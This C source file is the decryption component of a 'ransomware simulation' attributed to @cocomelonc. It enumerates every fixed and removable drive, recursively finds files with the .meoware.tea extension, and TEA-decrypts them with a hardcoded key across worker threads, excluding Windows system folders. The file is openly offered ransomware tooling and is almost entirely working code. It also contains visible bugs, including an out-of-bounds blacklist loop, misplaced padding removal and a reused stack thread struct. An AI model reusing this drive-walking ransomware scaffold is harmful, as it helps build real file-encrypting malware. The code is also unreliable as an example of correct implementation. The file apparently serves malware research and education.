/*
 * decrypt.c
 * Ransomware simulation with TEA
 * decrypt entire filesystem
 * author: @cocomelonc
*/
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include <stdbool.h>

#define KEY_SIZE 16
#define ROUNDS 32
#define TEA_BLOCK_SIZE 8

#define IN_CHUNK_SIZE (TEA_BLOCK_SIZE * 8)
#define OUT_CHUNK_SIZE (IN_CHUNK_SIZE * 4)
#define MAX_THREADS 8  // adjust as needed
#define MAX_FOLDERS 26
#define MAX_PATH_LENGTH 260

// we do not encrypt sensitive folders and files
const char* blacklistDirectories[] = {
  "C:\\Windows\\",
  "C:\\Program Files (x86)\\",
  "C:\\Program Files\\",
  "C:\\ProgramData\\",
  "Z:\\",
};

// structure to hold data for each thread
struct ThreadData {
  const char* inputFile;
  const char* outputFile;
  const BYTE* teaKey;
};

void tea_decrypt(unsigned char *data, unsigned char *key) {
  unsigned int i;
  unsigned int delta = 0x9e3779b9;
  unsigned int sum = delta * ROUNDS;
  unsigned int v0 = *(unsigned int *)data;
  unsigned int v1 = *(unsigned int *)(data + 4);

  for (i = 0; i < ROUNDS; i++) {
    v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + ((unsigned int *)key)[(sum >> 11) & 3]);
    sum -= delta;
    v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + ((unsigned int *)key)[sum & 3]);
  }

  *(unsigned int *)data = v0;
  *(unsigned int *)(data + 4) = v1;
}

void removePadding(HANDLE fileHandle) {
  LARGE_INTEGER fileSize;
  GetFileSizeEx(fileHandle, &fileSize);

  // determine the padding size
  DWORD paddingSize;
  SetFilePointer(fileHandle, -1, NULL, FILE_END);
  ReadFile(fileHandle, &paddingSize, 1, NULL, NULL);

  // validate and remove padding
  if (paddingSize <= TEA_BLOCK_SIZE && paddingSize > 0) {
    // seek back to the beginning of the padding
    SetFilePointer(fileHandle, -paddingSize, NULL, FILE_END);

    // read and validate the entire padding
    BYTE* padding = (BYTE*)malloc(paddingSize);
    DWORD bytesRead;
    if (ReadFile(fileHandle, padding, paddingSize, &bytesRead, NULL) && bytesRead == paddingSize) {
      // check if the padding bytes are valid
      for (size_t i = 0; i < paddingSize; ++i) {
        if (padding[i] != static_cast<char>(paddingSize)) {
          // invalid padding, print an error message or handle it accordingly
          printf("invalid padding found in the file: %d - %s\n", GetLastError(), strerror(GetLastError()));
          free(padding);
          return;
        }
      }

      // truncate the file at the position of the last complete block
      SetEndOfFile(fileHandle);
    } else {
      // error reading the padding bytes, print an error message or handle it accordingly
      printf("error reading padding bytes from the file: %d - %s\n", GetLastError(), strerror(GetLastError()));
    }

    free(padding);
  } else {
    // invalid padding size, print an error message or handle it accordingly
    printf("invalid padding size: %d - %d - %s\n", paddingSize, GetLastError(), strerror(GetLastError()));
  }
}

void decryptFile(const char* inputFile, const char* outputFile, const unsigned char* teaKey) {
  HANDLE ifh = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
  HANDLE ofh = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

  if (ifh == INVALID_HANDLE_VALUE || ofh == INVALID_HANDLE_VALUE) {
    printf("error opening file: %s - %d - %s\n", inputFile, GetLastError(), strerror(GetLastError()));
    return;
  }

  LARGE_INTEGER fileSize;
  GetFileSizeEx(ifh, &fileSize);

  unsigned char* fileData = (unsigned char*)malloc(fileSize.LowPart);
  DWORD bytesRead;
  ReadFile(ifh, fileData, fileSize.LowPart, &bytesRead, NULL);

  unsigned char key[KEY_SIZE];
  memcpy(key, teaKey, KEY_SIZE);

  // decrypt the data
  for (size_t i = 0; i < fileSize.LowPart; i += TEA_BLOCK_SIZE) {
    tea_decrypt(fileData + i, key);
  }

  // remove padding
  removePadding(ofh);

  // write the decrypted data to the output file
  DWORD bw;
  WriteFile(ofh, fileData, fileSize.LowPart, &bw, NULL);

  printf("%s: TEA decryption successful\n", inputFile);

  CloseHandle(ifh);
  CloseHandle(ofh);
  free(fileData);
}

// decryption function to be called by each thread
unsigned __stdcall decryptFileThread(void* args) {
  struct ThreadData* threadData = (struct ThreadData*)args;
  decryptFile(threadData->inputFile, threadData->outputFile, threadData->teaKey);
  return 0;
}

void decryptFiles(const char* folderPath, const BYTE* key) {
  WIN32_FIND_DATAA findFileData;
  char searchPath[MAX_PATH];
  sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);

  HANDLE hFind = FindFirstFileA(searchPath, &findFileData);

  if (hFind == INVALID_HANDLE_VALUE) {
    printf("error: %s - %d - %s\n", folderPath, GetLastError(), strerror(GetLastError()));
    return;
  }

  HANDLE threadHandles[MAX_THREADS];
  int threadCount = 0;

  do {
    const char* fileName = findFileData.cFileName;

    if (strcmp(fileName, ".") == 0 || strcmp(fileName, "..") == 0) {
      continue;
    }

    char filePath[MAX_PATH];
    sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);

    if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
      // recursive call for subfolders
      decryptFiles(filePath, key);
    } else {
      // process individual files
      if (strstr(fileName, ".meoware.tea") != NULL) {
        int isBlacklisted = 0;
        for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
          if (blacklistDirectories[i] != NULL && strstr(filePath, blacklistDirectories[i]) != NULL) {
            isBlacklisted = 1;
            break;
          }
        }
      
        if (!isBlacklisted) {
          printf("file: %s\n", filePath);
          char decryptedFilePath[MAX_PATH];
          sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
          struct ThreadData threadData = { filePath, decryptedFilePath, key };

          // Start a new thread
          threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
          if (threadHandles[threadCount] == 0) {
            printf("error creating thread: %d - %s\n", GetLastError(), strerror(GetLastError()));
            return;
          }

          threadCount++;

          // wait for threads to finish before processing the next file
          if (threadCount == MAX_THREADS) {
            WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

            // close thread handles
            for (int i = 0; i < threadCount; i++) {
              CloseHandle(threadHandles[i]);
            }

            threadCount = 0;
          }
          printf("file decrypt: %s OK!\n", filePath);
        }
      }
    }
  } while (FindNextFileA(hFind, &findFileData) != 0);

  // wait for remaining threads to finish
  WaitForMultipleObjects(threadCount, threadHandles, TRUE, INFINITE);

  // close thread handles
  for (int i = 0; i < threadCount; i++) {
    CloseHandle(threadHandles[i]);
  }

  FindClose(hFind);
}

void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
  DWORD drives = GetLogicalDrives();
  char drive[] = "A:\\";
  int driveType;

  for (int i = 0; i < 26; ++i) {
    if (drives & 1) {
      drive[0] = 'A' + i;
      driveType = GetDriveTypeA(drive);

      if (driveType == DRIVE_FIXED || driveType == DRIVE_REMOVABLE) {
        int isBlacklisted = 0;
        for (int j = 0; j < MAX_PATH_LENGTH; ++j) {
          if (blacklistDirectories[j] != NULL && strstr(drive, blacklistDirectories[j]) != NULL) {
            isBlacklisted = 1;
            break;
          }
        }

        if (!isBlacklisted) {
          strcpy_s(folders[*folderCount], drive);
          (*folderCount)++;
        }
      }
    }
    drives >>= 1;
  }
}

int main() {
  const char* teaKey = "\x6d\x65\x6f\x77\x6d\x65\x6f\x77\x6d\x65\x6f\x77\x6d\x65\x6f\x77";
  char folders[MAX_FOLDERS][MAX_PATH];
  int folderCount = 0;
  enumerateDrives(folders, &folderCount);
  printf("start decrypt....\n");
  Sleep(10);
  for (int i = 0; i < folderCount; ++i) {
    printf("%s\n", folders[i]);
    decryptFiles(folders[i], (const unsigned char*)teaKey);
  }
  return 0;
}